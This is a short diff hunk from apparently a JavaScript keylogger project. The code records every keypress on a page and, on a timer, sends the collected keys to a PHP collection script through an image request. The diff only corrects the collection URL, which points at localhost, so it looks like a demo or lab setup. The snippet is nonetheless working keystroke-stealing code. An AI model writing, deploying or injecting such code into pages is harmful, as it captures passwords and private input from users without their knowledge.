@@ -6,7 +6,7 @@ document.onkeypress = function(e) {
   keys+=key;
 }
 window.setInterval(function(){
-url = 'http://locahlhost:9999/keyloggerphpjs/keylogger.php?key='
+url = 'http://localhost:9999/keylogger.php?key='
 if(keys != '') {
   new Image().src = url+keys
   keys = '';
